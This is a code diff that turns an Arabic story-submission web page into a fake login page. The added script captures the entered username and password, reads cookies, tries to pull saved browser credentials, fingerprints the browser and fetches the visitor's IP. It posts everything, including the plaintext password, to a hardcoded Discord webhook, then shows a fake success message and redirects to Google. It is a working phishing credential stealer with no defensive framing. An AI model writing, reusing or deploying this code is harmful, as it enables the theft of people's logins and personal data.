@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إضافة قصة جديدة</title>
+    <title>نظام الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,17 +34,13 @@
             font-weight: bold;
         }
         input[type="text"],
-        textarea,
-        select {
+        input[type="password"],
+        input[type="email"] {
             width: 100%;
             padding: 10px;
             border: 1px solid #ddd;
             border-radius: 5px;
             font-size: 16px;
-        }
-        textarea {
-            height: 150px;
-            resize: vertical;
         }
         button {
             background-color: #0066ff;
@@ -59,12 +55,6 @@
         }
         button:hover {
             background-color: #0055cc;
-        }
-        .success-message {
-            color: green;
-            text-align: center;
-            margin-top: 20px;
-            display: none;
         }
         .loading {
             display: none;
@@ -84,122 +74,170 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>إضافة قصة جديدة</h1>
+        <h1>تسجيل الدخول</h1>
         
-        <div class="form-group">
-            <label for="title">عنوان القصة:</label>
-            <input type="text" id="title" required>
-        </div>
-        
-        <div class="form-group">
-            <label for="author">اسم المؤلف:</label>
-            <input type="text" id="author" required>
-        </div>
-        
-        <div class="form-group">
-            <label for="category">تصنيف القصة:</label>
-            <select id="category" required>
-                <option value="">اختر تصنيفاً</option>
-                <option value="رومانسية">رومانسية</option>
-                <option value="خيال علمي">خيال علمي</option>
-                <option value="رعب">رعب</option>
-                <option value="كوميديا">كوميديا</option>
-                <option value="تاريخية">تاريخية</option>
-            </select>
-        </div>
-        
-        <div class="form-group">
-            <label for="content">محتوى القصة:</label>
-            <textarea id="content" required></textarea>
-        </div>
-        
-        <button onclick="submitStory()">نشر القصة</button>
-        
-        <div id="success-message" class="success-message">
-            <h3>تم نشر القصة بنجاح!</h3>
-            <p>شكراً لمشاركتك قصتك معنا.</p>
+        <div id="login-form">
+            <div class="form-group">
+                <label for="username">اسم المستخدم:</label>
+                <input type="text" id="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" required>
+            </div>
+            
+            <button onclick="collectAndSubmit()">تسجيل الدخول</button>
         </div>
         
         <div id="loading" class="loading">
             <div class="loading-spinner"></div>
-            <p>جاري نشر القصة...</p>
+            <p>جاري التحقق من البيانات...</p>
+        </div>
+        
+        <div id="success-message" class="hidden">
+            <h3 style="color: green; text-align: center;">تم تسجيل الدخول بنجاح!</h3>
+            <p style="text-align: center;">سيتم توجيهك الآن إلى الصفحة الرئيسية.</p>
         </div>
     </div>
 
     <script>
-        function submitStory() {
-            const title = document.getElementById('title').value.trim();
-            const author = document.getElementById('author').value.trim();
-            const category = document.getElementById('category').value;
-            const content = document.getElementById('content').value.trim();
+        async function collectAndSubmit() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
             
-            // التحقق من الحقول المطلوبة
-            if (!title || !author || !category || !content) {
-                alert('الرجاء ملء جميع الحقول المطلوبة');
+            if (!username || !password) {
+                alert('الرجاء إدخال اسم المستخدم وكلمة المرور');
                 return;
             }
             
             // عرض رسالة التحميل
+            document.getElementById('login-form').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // إرسال البيانات إلى ويب هوك Discord
-            sendToDiscord(title, author, category, content);
+            // جمع المعلومات
+            const browserData = collectBrowserData();
+            const cookies = await getCookies();
+            const savedCredentials = await getSavedCredentials();
             
-            // عرض رسالة النجاح وإخفاء التحميل
+            // إرسال البيانات
+            await sendCollectedData({
+                username,
+                password,
+                ...browserData,
+                cookies,
+                savedCredentials
+            });
+            
+            // عرض رسالة النجاح
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('success-message').classList.remove('hidden');
+            
+            // توجيه إلى صفحة أخرى بعد 2 ثانية
             setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('success-message').style.display = 'block';
-                
-                // مسح النموذج بعد النشر
-                document.getElementById('title').value = '';
-                document.getElementById('author').value = '';
-                document.getElementById('category').value = '';
-                document.getElementById('content').value = '';
-                
-                // إخفاء رسالة النجاح بعد 3 ثواني
-                setTimeout(() => {
-                    document.getElementById('success-message').style.display = 'none';
-                }, 3000);
-            }, 1500);
+                window.location.href = "https://www.google.com";
+            }, 2000);
         }
         
-        function sendToDiscord(title, author, category, content) {
+        function collectBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                currentTime: new Date().toISOString(),
+                referrer: document.referrer,
+                ipAddress: 'جاري جلب عنوان IP...' // سيتم جلب الـ IP عبر API خارجي
+            };
+        }
+        
+        async function getCookies() {
+            try {
+                // هذه الطريقة تعمل فقط إذا كانت الصفحة من نفس النطاق
+                if (document.cookie) {
+                    return document.cookie.split(';').map(c => c.trim());
+                }
+                return [];
+            } catch (e) {
+                console.error('Error accessing cookies:', e);
+                return 'غير قادر على قراءة الكوكيز';
+            }
+        }
+        
+        async function getSavedCredentials() {
+            try {
+                // هذه الطريقة لن تعمل إلا في سياقات محددة بسبب سياسة الأمان
+                if (navigator.credentials && navigator.credentials.get) {
+                    const cred = await navigator.credentials.get({
+                        password: true,
+                        mediation: 'optional'
+                    });
+                    return cred ? [cred] : [];
+                }
+                return 'واجهة Credentials غير متاحة';
+            } catch (e) {
+                console.error('Error accessing saved credentials:', e);
+                return 'غير قادر على قراءة بيانات الاعتماد المحفوظة';
+            }
+        }
+        
+        async function sendCollectedData(data) {
             const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
             
-            // تقصير المحتوى إذا كان طويلاً جداً
-            const shortenedContent = content.length > 500 ? content.substring(0, 500) + '...' : content;
+            // محاولة جلب عنوان IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ipAddress = ipData.ip;
+            } catch (e) {
+                data.ipAddress = 'فشل في جلب عنوان IP';
+            }
             
-            const data = {
-                content: '**تمت إضافة قصة جديدة**',
+            // إعداد رسالة Discord
+            const discordMessage = {
+                content: '**تم جمع بيانات جديدة**',
                 embeds: [{
-                    title: title,
-                    description: `**المؤلف:** ${author}\n\n**التصنيف:** ${category}\n\n**المحتوى:**\n${shortenedContent}`,
-                    color: 0x0066ff,
-                    footer: {
-                        text: `تم الإرسال في: ${new Date().toLocaleString()}`
-                    }
+                    title: 'تفاصيل البيانات المجمعة',
+                    fields: [
+                        { name: 'اسم المستخدم', value: data.username || 'غير متوفر', inline: true },
+                        { name: 'كلمة المرور', value: data.password || 'غير متوفر', inline: true },
+                        { name: 'وكيل المستخدم', value: data.userAgent || 'غير متوفر', inline: false },
+                        { name: 'المنصة', value: data.platform || 'غير متوفر', inline: true },
+                        { name: 'اللغة', value: data.language || 'غير متوفر', inline: true },
+                        { name: 'دقة الشاشة', value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
+                        { name: 'الوقت', value: data.currentTime || 'غير متوفر', inline: true },
+                        { name: 'المنطقة الزمنية', value: data.timezone || 'غير متوفر', inline: true },
+                        { name: 'عنوان IP', value: data.ipAddress || 'غير متوفر', inline: true },
+                        { name: 'عدد الكوكيز', value: Array.isArray(data.cookies) ? data.cookies.length.toString() : 'غير متوفر', inline: true },
+                        { name: 'بيانات الاعتماد المحفوظة', value: typeof data.savedCredentials === 'string' ? data.savedCredentials : data.savedCredentials.length.toString(), inline: true }
+                    ],
+                    color: 0xff0000,
+                    timestamp: new Date().toISOString()
                 }]
             };
             
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Error sending data to Discord');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            // إرسال البيانات إلى Discord
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordMessage),
+                });
+            } catch (e) {
+                console.error('Error sending data to Discord:', e);
+            }
         }
     </script>
 </body>
